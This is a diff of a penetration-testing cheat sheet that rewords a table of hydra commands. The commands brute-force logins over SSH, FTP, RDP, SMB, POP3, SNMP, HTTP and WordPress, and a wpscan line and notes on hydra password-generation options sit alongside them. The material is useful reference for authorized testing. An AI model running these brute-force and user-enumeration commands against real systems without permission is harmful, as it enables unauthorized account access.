@@ -30,25 +30,25 @@ Below are a few scriptable examples to brute force logins of common protocols.
 
 | Command | Description |
 | :--- | :--- |
-| `hydra -P $pass_list -v $ip snmp -vV` | Brute force against SNMP |
-| `hydra -t 1 -l $user -P $pass_list -vV $ip ftp` | FTP with  known user using password list |
-| `hydra -vV -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH using list of users and passwords |
-| `hydra -vV -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH with a known password and a username list |
-| `hydra -vV $ip -s $port ssh -l $user -P $pass_list` | SSH with known username on non-standard port |
-| `hydra -vV -l $user -P $pass_list -f $ip pop3` | POP3 Brute Force |
-| `hydra -vV -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET with user and pass list |
-| `hydra -vV -t 1 -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop with pass list |
-| `hydra -vV -t 1 -f -l $user -P $pass_list $ip smb` | SMB brute force with known user and pass list |
-| `hydra -vV -l $user -P $pass_list $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress brute force an admin login |
-| `hydra -vV -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress enumerate users |
+| `hydra -P $pass_list -v $ip snmp -vV` | SNMP: Brute force |
+| `hydra -t 1 -l $user -P $pass_list -vV $ip ftp` | FTP: with known user, using password list |
+| `hydra -vV -u -L $users_list -P $pass_list -t 1 -u $ip ssh` | SSH: using users list, and passwords list |
+| `hydra -vV -u -L $users_list -p $pass -t 1 -u $ip ssh` | SSH: with a known password, and a username list |
+| `hydra -vV $ip -s $port ssh -l $user -P $pass_list` | SSH: with known username on non-standard port |
+| `hydra -vV -l $user -P $pass_list -f $ip pop3` | POP3: Brute Force |
+| `hydra -vV -L $users_list -P $pass_list $ip http-get $login_page` | HTTP GET: with user list and pass list |
+| `hydra -vV -t 1 -f -l $user -P $pass_list rdp://$ip` | Windows Remote Desktop: with known username, and pass list |
+| `hydra -vV -t 1 -f -l $user -P $pass_list $ip smb` | SMB: brute force with known user, and pass list |
+| `hydra -vV -l $user -P $pass_list $ip http-form-post '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location'` | WordPress: brute force an admin login |
+| `hydra -vV -L $users_list -p $pass $ip http-post-form '/wp-login.php:log=^USER^&pwd=^PASS^&wp-submit=Log+In:F=Invalid username'` | WordPress: enumerate users |
 | `wpscan --url $url -U $user -P $pass_list` | Use wpscan to brute force password with known user |
 
 #### Other useful Hydra options
 
-**-x min:max:charset -** Generate passwords from min to max length. Charset can contain `1` for numbers, `a` for lowercase and `A` for uppercase characters.  Any other character that is added is put in the list.   
-Example: `1:2:a1%.` The generated passwords will be of length 1 to 2 and contain lowercase letters, numbers and/or percent signs and dots.
+**`-x min:max:charset` -** Generate passwords from min to max length. Charset can contain `1` for numbers, `a` for lowercase and `A` for uppercase characters.  Any other character that is added is put in the list.   
+Example: `1:2:a1%.` The generated passwords will be of length 1 to 2 and contain lowercase letters, numbers and/or percent signs and periods/dots.
 
-**-e nsr -** Do additional checks. `n` for null password, `s` try login as pass, `r` try the reverse login as pass
+**`-e nsr` -** Do additional checks. `n` for null password, `s` try login as pass, `r` try the reverse login as pass
 
 ### crackmapexec
 
